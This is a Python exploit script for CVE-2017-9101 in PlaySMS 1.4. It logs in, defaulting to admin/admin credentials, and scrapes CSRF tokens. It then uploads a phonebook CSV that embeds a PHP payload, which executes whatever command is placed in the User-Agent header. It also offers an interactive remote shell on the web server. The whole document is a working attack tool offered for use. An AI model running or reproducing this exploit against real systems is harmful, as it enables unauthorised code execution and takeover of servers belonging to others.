#!/usr/bin/env python3
#
# Exploit for CVE-2017-9101 targeting PlaySMS 1.4
# As an authenticated user it's possible to perform remote code execution in
# the context of the user that's running the webserver.
# https://www.exploit-db.com/exploits/42044/

import argparse
import random
import requests
import sys

from bs4 import BeautifulSoup

def pr_ok(msg):
    print('[+] {}'.format(msg))

def pr_err(msg, exit=True, rc=1):
    print('[-] {}'.format(msg))
    if exit:
        sys.exit(rc)

def pr_info(msg):
    print('[*] {}'.format(msg))

def csrf_token(html, quiet=True):
    # Grab the CSRF token
    soup = BeautifulSoup(html, 'html.parser')
    try:
        token = soup.find(attrs={'name': 'X-CSRF-Token'})['value']
    except:
        pr_err('Could not determine CSRF token')

    if not quiet:
        pr_ok('Got token: {}'.format(token))
    return token

def exec(session, token, import_url, command, quiet):
    warhead = "<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>"
    payload = 'Name,Email,Department\n'
    payload += '{},{},{}'.format(warhead, random.randint(0, 42), random.randint(0, 42))

    # Here comes the fun part of actually embedding our command into the User-Agent header
    headers = {
        'user-agent': command,
        'Upgrade-Insecure-Requests': '1',
    }

    files = {
        'X-CSRF-Token': (None, token),
        'fnpb': ('p.csv', payload, 'text/csv')
    }

    try:
        if not quiet:
            pr_info('Attempting to execute payload')
        r = session.post(import_url + '&op=import', headers = headers, files = files)
    except Exception as e:
        pr_err(e)

    if r.status_code != 200:
        pr_err('Failed to execute payload (can be safely ignored for long running commands...)')

    # Locate the table previewing the upload
    try:
        soup = BeautifulSoup(r.text, 'html.parser')
        table = soup.find('table', class_='playsms-table-list')

        # Now look for the cell with our shell output
        output = table.find('td').next_sibling.next_sibling.contents
        for line in output:
            print(line)

        # Pass the CSRF token to the caller for a future POST
        return csrf_token(r.text)
    except Exception as e:
        pr_err('Failed to run "{}": {}'.format(command, e), False)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--username', default='admin', type=str)
    parser.add_argument('--password', default='admin', type=str)
    parser.add_argument('--url', required=True, type=str)
    parser.add_argument('--interactive', '-i', default=False, action='store_true')
    parser.add_argument('--command', '-c', type=str)
    args = parser.parse_args()

    if (args.command and args.interactive) or (not (args.interactive or args.command)):
        pr_err('Either --command or --interactive required.')

    login_url = args.url + '/index.php?app=main&inc=core_auth&route=login'

    session = requests.Session()

    try:
        pr_info('Grabbing CSRF token for login')
        r = session.get(login_url)
    except Exception as e:
        pr_err(e)

    if r.status_code != 200:
        pr_err('Couln\'t retrieve login page.')

    token = csrf_token(r.text)

    try:
        pr_info('Attempting to login as {}'.format(args.username))
        data = {
            'username': args.username,
            'password': args.password,
            'X-CSRF-Token': token,
        }
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'Referer': login_url,
        }

        r = session.post(login_url + '&op=login', data = data, headers = headers)
    except Exception as e:
        pr_err(e)

    pr_ok('Logged in!')

    import_url = args.url + '/index.php?app=main&inc=feature_phonebook&route=import'
    try:
        pr_info('Grabbing CSRF token for phonebook import')
        r = session.get(import_url + '&op=list')
    except Exception as e:
        pr_err(e)

    token = csrf_token(r.text)

    if args.command:
        exec(session, token, import_url, args.command, False)
    elif args.interactive:
        pr_ok('Entering interactive shell; type "quit" or ^D to quit')

        while True:
            try:
                command = input('> ')
            except EOFError:
                sys.exit(0)

            if command in ['quit', 'q']:
                sys.exit(0)

            token = exec(session, token, import_url, command, True)


if __name__ == '__main__':
    main()
